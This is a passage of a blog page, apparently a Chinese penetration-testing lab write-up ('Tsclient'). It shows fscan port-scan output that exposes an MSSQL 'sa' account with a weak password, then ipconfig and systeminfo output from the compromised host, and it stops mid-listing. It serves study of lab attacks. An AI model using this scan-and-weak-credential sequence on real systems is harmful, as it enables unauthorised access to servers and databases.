@@ -1,0 +1,897 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/"><meta name="generator" content="Astro v5.12.0"><!-- General Meta Tags --><title>春秋云镜 Tsclient Writeup | X1r0z Blog</title><meta name="title" content="春秋云镜 Tsclient Writeup | X1r0z Blog"><meta name="description" content="春秋云镜 Tsclient Writeup"><meta name="author" content="X1r0z"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="春秋云镜 Tsclient Writeup | X1r0z Blog"><meta property="og:description" content="春秋云镜 Tsclient Writeup"><meta property="og:url" content="https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/"><meta property="og:image" content="https://exp10it.io/og.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2023-07-30T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://exp10it.io/posts/chunqiuyunjing-tsclient-writeup/"><meta property="twitter:title" content="春秋云镜 Tsclient Writeup | X1r0z Blog"><meta property="twitter:description" content="春秋云镜 Tsclient Writeup"><meta property="twitter:image" content="https://exp10it.io/og.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"春秋云镜 Tsclient Writeup | X1r0z Blog","image":"https://exp10it.io/og.png","datePublished":"2023-07-30T00:00:00.000Z","author":[{"@type":"Person","name":"X1r0z","url":"https://exp10it.io/"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="X1r0z Blog" href="https://exp10it.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.D98dxaWf.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.Cn_dDryL.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: \6625\79CB\4E91\955C-tsclient-writeup; }@layer astro { ::view-transition-old(\6625\79CB\4E91\955C-tsclient-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\6625\79CB\4E91\955C-tsclient-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\6625\79CB\4E91\955C-tsclient-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\6625\79CB\4E91\955C-tsclient-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: windows; }@layer astro { ::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-3"] { view-transition-name: mssql; }@layer astro { ::view-transition-old(mssql) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(mssql) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(mssql) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(mssql) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-4"] { view-transition-name: active-directory; }@layer astro { ::view-transition-old(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-5"] { view-transition-name: rdp; }@layer astro { ::view-transition-old(rdp) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(rdp) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(rdp) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(rdp) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute start-16 -top-full z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-app flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none"> X1r0z Blog </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/links">
+Links
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="mx-auto max-w-app px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-app items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-app px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> 春秋云镜 Tsclient Writeup </h1> <div class="my-2 flex items-center gap-2"> <div class="flex items-center gap-x-2 opacity-80"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg>  <time class="text-sm sm:text-base" datetime="2023-07-30T00:00:00.000Z">30 Jul, 2023</time> </div> <span aria-hidden="true" class="max-sm:hidden">|</span> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/chunqiuyunjing-tsclient-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent max-sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> </div> <article id="article" class="app-prose mx-auto mt-8 max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg)"> <h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#flag01">flag01</a></li>
+<li><a href="#flag02">flag02</a></li>
+<li><a href="#flag03">flag03</a></li>
+<li><a href="#%E5%90%8E%E8%AE%B0">后记</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="flag01">flag01</h2>
+<p>fscan</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ fscan ./fscan_darwin_arm64 -h 39.99.141.107</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   ___                              _</span></span>
+<span class="line"><span>  / _ \     ___  ___ _ __ __ _  ___| | __</span></span>
+<span class="line"><span> / /_\/____/ __|/ __| '__/ _` |/ __| |/ /</span></span>
+<span class="line"><span>/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;</span></span>
+<span class="line"><span>\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span>
+<span class="line"><span>                     fscan version: 1.8.2</span></span>
+<span class="line"><span>start infoscan</span></span>
+<span class="line"><span>trying RunIcmp2</span></span>
+<span class="line"><span>The current user permissions unable to send icmp packets</span></span>
+<span class="line"><span>start ping</span></span>
+<span class="line"><span>(icmp) Target 39.99.141.107   is alive</span></span>
+<span class="line"><span>[*] Icmp alive hosts len is: 1</span></span>
+<span class="line"><span>39.99.141.107:1433 open</span></span>
+<span class="line"><span>39.99.141.107:139 open</span></span>
+<span class="line"><span>39.99.141.107:135 open</span></span>
+<span class="line"><span>39.99.141.107:80 open</span></span>
+<span class="line"><span>[*] alive ports len is: 4</span></span>
+<span class="line"><span>start vulscan</span></span>
+<span class="line"><span>[*] WebTitle: http://39.99.141.107      code:200 len:703    title:IIS Windows Server</span></span>
+<span class="line"><span>[*] NetInfo:</span></span>
+<span class="line"><span>[*]39.99.141.107</span></span>
+<span class="line"><span>   [->]WIN-WEB</span></span>
+<span class="line"><span>   [->]172.22.8.18</span></span>
+<span class="line"><span>   [->]2001:0:348b:fb58:4f2:1ea1:d89c:7294</span></span>
+<span class="line"><span>[+] mssql:39.99.141.107:1433:sa 1qaz!QAZ</span></span>
+<span class="line"><span>已完成 4/4</span></span>
+<span class="line"><span>[*] 扫描结束,耗时: 19.03864925s</span></span></code></pre>
+<p>mssql 弱口令, 直接上 MDUT</p>
+<p><img src="https://img.exp10it.io/img/202307301505710.png" alt="image-20230730150556671"></p>
+<p>ipconfig</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Windows IP 配置</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>以太网适配器 以太网 2:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   连接特定的 DNS 后缀 . . . . . . . :</span></span>
+<span class="line"><span>   本地链接 IPv6 地址. . . . . . . . : fe80::95df:a060:ade9:6939%8</span></span>
+<span class="line"><span>   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18</span></span>
+<span class="line"><span>   子网掩码  . . . . . . . . . . . . : 255.255.0.0</span></span>
+<span class="line"><span>   默认网关. . . . . . . . . . . . . : 172.22.255.253</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>隧道适配器 Teredo Tunneling Pseudo-Interface:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   连接特定的 DNS 后缀 . . . . . . . :</span></span>
+<span class="line"><span>   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4f2:1ea1:d89c:7294</span></span>
+<span class="line"><span>   本地链接 IPv6 地址. . . . . . . . : fe80::4f2:1ea1:d89c:7294%12</span></span>
+<span class="line"><span>   默认网关. . . . . . . . . . . . . : ::</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>隧道适配器 isatap.{7901C223-3BC4-42B0-BD21-258AA6858209}:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span></span>
+<span class="line"><span>   连接特定的 DNS 后缀 . . . . . . . :</span></span></code></pre>
+<p>systeminfo</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>主机名:           WIN-WEB</span></span>
+<span class="line"><span>OS 名称:          Microsoft Windows Server 2016 Datacenter</span></span>
+<span class="line"><span>OS 版本:          10.0.14393 暂缺 Build 14393</span></span>
+<span class="line"><span>OS 制造商:        Microsoft Corporation</span></span>
+<span class="line"><span>OS 配置:          独立服务器</span></span>
+<span class="line"><span>OS 构件类型:      Multiprocessor Free</span></span>
+<span class="line"><span>注册的所有人:</span></span>
+<span class="line"><span>注册的组织:       Aliyun</span></span>
+<span class="line"><span>产品 ID:          00376-40000-00000-AA947</span></span>
+<span class="line"><span>初始安装日期:     2022/7/11, 12:46:14</span></span>
+<span class="line"><span>系统启动时间:     2023/7/30, 15:02:31</span></span>
+<span class="line"><span>系统制造商:       Alibaba Cloud</span></span>
+<span class="line"><span>系统型号:         Alibaba Cloud ECS</span></span>
+<span class="line"><span>系统类型:         x64-based PC</span></span>
+<span class="line"><span>处理器:           安装了 1 个处理器。</span></span>
+<span class="line"><span>                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2500 Mhz</span></span>
+<span class="line"><span>BIOS 版本:        SeaBIOS 449e491, 2014/4/1</span></span>
+<span class="line"><span>Windows 目录:     C:\Windows</span></span>
+<span class="line"><span>系统目录:         C:\Windows\system32</span></span>
+<span class="line"><span>启动设备:         \Device\HarddiskVolume1</span></span>
+<span class="line"><span>系统区域设置:     zh-cn;中文(中国)</span></span>
+<span class="line"><span>输入法区域设置:   zh-cn;中文(中国)</span></span>
+<span class="line"><span>时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span></span>
+<span class="line"><span>物理内存总量:     4,095 MB</span></span>
+<span class="line"><span>可用的物理内存:   1,918 MB</span></span>
+<span class="line"><span>虚拟内存: 最大值: 4,799 MB</span></span>
+<span class="line"><span>虚拟内存: 可用:   1,574 MB</span></span>
+<span class="line"><span>虚拟内存: 使用中: 3,225 MB</span></span>
+<span class="line"><span>页面文件位置:     C:\pagefile.sys</span></span>
+<span class="line"><span>域:               WORKGROUP</span></span>
+<span class="line"><span>登录服务器:       暂缺</span></span>
+<span class="line"><span>修补程序:         安装了 6 个修补程序。</span></span>
+<span class="line"><span>                  [01]: KB5013625</span></span>
+<span class="line"><span>                  [02]: KB4049065</span></span>
+<span class="line"><span>                  [03]: KB4486129</span></span>
+<span class="line"><span>                  [04]: KB4486131</span></span>
+<span class="line"><span>                  [05]: KB5014026</span></span>
